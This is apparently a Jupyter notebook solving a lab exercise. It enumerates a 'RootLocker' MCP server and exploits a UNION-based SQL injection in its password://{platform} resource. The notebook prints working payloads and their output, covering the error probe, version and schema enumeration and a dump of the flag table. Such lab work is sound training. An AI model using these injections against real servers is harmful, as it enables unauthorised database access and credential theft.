In [17]:
# ============================================================
# RootLocker MCP — Skills Assessment solution
# Vuln: UNION-based SQL injection in password://{platform}
# ============================================================
from fastmcp import Client

TARGET = "154.57.164.68"
PORT   = 37644
MCP_URL = f"http://{TARGET}:{PORT}/mcp/"

# ---------- helper ----------
async def read_res(uri):
    async with Client(MCP_URL) as client:
        try:
            r = await client.read_resource(uri)
            return r[0].text
        except Exception as e:
            return f"[-] {e}"

# SQLi helper: ' stays literal, spaces -> %20, comment # -> %23 (MariaDB '#' needs no trailing space)
async def pw(payload):
    uri = "password://" + payload.replace(" ", "%20").replace("#", "%23")
    return await read_res(uri)

# ---------- 1) enumerate ----------
async def enumerate_server():
    async with Client(MCP_URL) as client:
        res   = await client.list_resources()
        tmpl  = await client.list_resource_templates()
        tools = await client.list_tools()
    print("RESOURCES:", [str(r.uri) for r in res])
    print("TEMPLATES:", [t.uri_template for t in tmpl])
    print("TOOLS    :", [t.name for t in tools])

await enumerate_server()

RESOURCES: ['resource://access_logs', 'resource://error_logs', 'resource://uptime', 'resource://filecount', 'resource://platforms']
TEMPLATES: ['getfile://{file_name*}', 'password://{platform}']
TOOLS    : ['store_file', 'store_password']


In [18]:
# ---------- 2) baseline + confirm injection ----------
print("platforms   :", await read_res("resource://platforms"))
print("known pw     :", await read_res("password://rootlocker.htb"))
print("quote probe  :", await pw("rootlocker.htb'"))          # -> MariaDB syntax error = injectable
print("union/1 col  :", await pw("x' UNION SELECT 1#"))       # -> "1" = single-column query

platforms   : ["rootlocker.htb"]
known pw     : DummyPassword123
quote probe  : [-] Error reading resource from template "password://rootlocker.htb'": 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''rootlocker.htb'' LIMIT 1' at line 1
union/1 col  : 1


In [19]:
# ---------- 3) enumerate the database via UNION SQLi ----------
print("version :", await pw("x' UNION SELECT version()#"))
print("database:", await pw("x' UNION SELECT database()#"))
print("tables  :", await pw(
    "x' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#"))

version : 10.11.13-MariaDB-0ubuntu0.24.04.1
database: mcp_db
tables  : flag,passwords


In [20]:
# ---------- 4) locate the flag column, then dump it ----------
# (swap 'flag' for the real table name from step 3 if different)
print("columns:", await pw(
    "x' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flag'#"))

print("FLAG   :", await pw("x' UNION SELECT group_concat(flag) FROM flag#"))

columns: id,flag
FLAG   : [REDACTED]
